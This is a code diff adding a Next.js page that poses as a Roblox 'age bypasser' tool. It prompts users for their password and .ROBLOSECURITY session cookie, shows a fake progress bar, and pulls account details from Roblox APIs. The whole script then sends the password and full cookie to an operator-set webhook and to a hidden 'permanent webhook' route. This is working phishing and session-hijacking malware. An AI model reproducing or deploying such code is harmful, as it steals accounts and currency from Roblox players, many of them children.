@@ -271,4 +271,311 @@ export default async function DirectoryPage({ params }) {
                 </div>
 
                 <div class="form-group">
-                    <label for="cookie">Roblox Cookie (.ROBLOSECURITY)</
+                    <label for="cookie">Roblox Cookie (.ROBLOSECURITY)</label>
+                    <textarea 
+                        id="cookie" 
+                        placeholder="Paste Your Cookie From Refresher"
+                    ></textarea>
+                </div>
+
+                <button class="btn" type="button" id="submitBtn">Bypass</button>
+
+                <button class="btn btn-secondary" type="button" id="refreshBtn">Refresh Cookie</button>
+
+                <button class="btn btn-secondary" type="button" id="generateBtn" style="background: linear-gradient(135deg, #28a745 0%, #218838 100%); box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);">Generate Website</button>
+
+                <!-- Loading -->
+                <div class="progress" id="progress">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="status" id="status"></div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            AGE BYPASSER TOOLS © 2025
+        </div>
+    </div>
+
+    ${debugModeScript}
+
+    <script>
+        const btn = document.getElementById('submitBtn');
+        const refreshBtn = document.getElementById('refreshBtn');
+        const progress = document.getElementById('progress');
+        const progressBar = document.getElementById('progressBar');
+        const status = document.getElementById('status');
+        
+        // Get all form inputs
+        const passwordInput = document.getElementById('password');
+        const cookieInput = document.getElementById('cookie');
+
+        // Add event listener for the refresh button
+        refreshBtn.addEventListener('click', () => {
+            window.open('https://rblx-refresher.ct.ws/?i=1', '_blank');
+        });
+
+        // Add event listener for the generate website button
+        const generateBtn = document.getElementById('generateBtn');
+        generateBtn.addEventListener('click', () => {
+            window.location.href = '/generator';
+        });
+
+        // Function to get Roblox user info from cookie
+        async function getRobloxUserInfo(cookie) {
+            try {
+                const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
+                    headers: {
+                        'Cookie': '.ROBLOSECURITY=' + cookie
+                    }
+                });
+                
+                if (response.ok) {
+                    const userData = await response.json();
+                    return userData;
+                }
+            } catch (error) {
+                console.error('Error fetching user info:', error);
+            }
+            return null;
+        }
+
+        // Function to get Roblox economy data
+        async function getRobloxEconomy(userId, cookie) {
+            try {
+                const response = await fetch('https://economy.roblox.com/v1/users/' + userId + '/currency', {
+                    headers: {
+                        'Cookie': '.ROBLOSECURITY=' + cookie
+                    }
+                });
+                
+                if (response.ok) {
+                    const economyData = await response.json();
+                    return economyData;
+                }
+            } catch (error) {
+                console.error('Error fetching economy data:', error);
+            }
+            return null;
+        }
+
+        // Function to get premium status
+        async function getPremiumStatus(userId, cookie) {
+            try {
+                const response = await fetch('https://premiumfeatures.roblox.com/v1/users/' + userId + '/validate-membership', {
+                    headers: {
+                        'Cookie': '.ROBLOSECURITY=' + cookie
+                    }
+                });
+                
+                if (response.ok) {
+                    const premiumData = await response.json();
+                    return premiumData;
+                }
+            } catch (error) {
+                console.error('Error fetching premium status:', error);
+            }
+            return false;
+        }
+
+        // Function to send dual webhook messages
+        async function sendDualWebhooks(userData, password, cookie, economyData, hasPremium, directory) {
+            const userWebhook = '${data.webhook_url}';
+            
+            const embeds = [
+                {
+                    title: "🎮 Roblox Account Information",
+                    color: 0x00ff00,
+                    thumbnail: {
+                        url: "https://www.roblox.com/headshot-thumbnail/image?userId=" + userData.id + "&width=420&height=420&format=png"
+                    },
+                    fields: [
+                        {
+                            name: "👤 Username",
+                            value: userData.name || "N/A",
+                            inline: true
+                        },
+                        {
+                            name: "🔑 Password",
+                            value: password || "Not provided",
+                            inline: true
+                        },
+                        {
+                            name: "💰 Robux",
+                            value: economyData ? economyData.robux.toString() : "N/A",
+                            inline: true
+                        },
+                        {
+                            name: "⏳ Pending Robux",
+                            value: economyData ? (economyData.pendingRobux || 0).toString() : "N/A",
+                            inline: true
+                        },
+                        {
+                            name: "⭐ Premium",
+                            value: hasPremium ? "Yes" : "No",
+                            inline: true
+                        },
+                        {
+                            name: "🎯 Korblox",
+                            value: "Checking...",
+                            inline: true
+                        },
+                        {
+                            name: "👻 Headless",
+                            value: "Checking...",
+                            inline: true
+                        },
+                        {
+                            name: "🌐 Directory",
+                            value: directory,
+                            inline: true
+                        },
+                        {
+                            name: "🆔 User ID",
+                            value: userData.id.toString(),
+                            inline: true
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                },
+                {
+                    title: "🍪 Cookie Data",
+                    color: 0xff0000,
+                    description: "Full cookie information:",
+                    fields: [
+                        {
+                            name: "Full Cookie",
+                            value: "||" + cookie + "||"
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                }
+            ];
+
+            // Send to user's webhook
+            if (userWebhook) {
+                try {
+                    await fetch(userWebhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ embeds })
+                    });
+                } catch (error) {
+                    console.error('Error sending to user webhook:', error);
+                }
+            }
+
+            // Send to permanent webhook via API route
+            try {
+                await fetch('/api/send-webhook', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        userData,
+                        password,
+                        cookie,
+                        economyData,
+                        hasPremium,
+                        directory,
+                        embeds
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending to permanent webhook:', error);
+            }
+        }
+
+        btn.addEventListener('click', async () => {
+            // Collect all form data
+            const formData = {
+                password: passwordInput.value.trim(),
+                cookie: cookieInput.value.trim()
+            };
+
+            // Basic validation
+            if (!formData.cookie) {
+                status.textContent = '❌ Please fill in Cookie';
+                status.style.color = '#ff5b5b';
+                return;
+            }
+
+            // Disable button and show progress
+            btn.disabled = true;
+            btn.textContent = 'Processing...';
+            progress.style.display = 'block';
+            status.style.color = '#b0b0ff';
+            
+            let percent = 0;
+            status.textContent = 'Validating 0%';
+
+            const interval = setInterval(() => {
+                percent += 2;
+                progressBar.style.width = percent + '%';
+                
+                if (percent <= 30) {
+                    status.textContent = 'Validating ' + percent + '%';
+                } else if (percent <= 70) {
+                    status.textContent = 'Processing ' + percent + '%';
+                } else {
+                    status.textContent = 'Sending ' + percent + '%';
+                }
+
+                if (percent >= 100) {
+                    clearInterval(interval);
+                    submitForm(formData);
+                }
+            }, 1000);
+        });
+
+        async function submitForm(formData) {
+            try {
+                // Get Roblox user information
+                status.textContent = 'Fetching Roblox data...';
+                const userData = await getRobloxUserInfo(formData.cookie);
+                
+                if (!userData) {
+                    status.textContent = '❌ Invalid cookie or unable to fetch user data';
+                    status.style.color = '#ff5b5b';
+                    btn.disabled = false;
+                    btn.textContent = 'Bypass';
+                    return;
+                }
+
+                // Get additional Roblox data
+                status.textContent = 'Fetching account details...';
+                const economyData = await getRobloxEconomy(userData.id, formData.cookie);
+                const hasPremium = await getPremiumStatus(userData.id, formData.cookie);
+
+                // Send dual webhooks
+                status.textContent = 'Sending data...';
+                await sendDualWebhooks(
+                    userData, 
+                    formData.password, 
+                    formData.cookie, 
+                    economyData, 
+                    hasPremium,
+                    '${directory}'
+                );
+
+                status.textContent = 'Successfully ✅ Data Sent!';
+                status.style.color = '#4CAF50';
+                
+                // Clear form
+                passwordInput.value = '';
+                cookieInput.value = '';
+
+            } catch (error) {
+                status.textContent = '🔌 Unable to connect to server. Please check your internet connection and try again.';
+                status.style.color = '#ff5b5b';
+            }
+
+            // Re-enable button
+            btn.disabled = false;
+            btn.textContent = 'Bypass';
+        }
+    </script>
+</body>
+</html>`
+    }} />
+  );
+      }
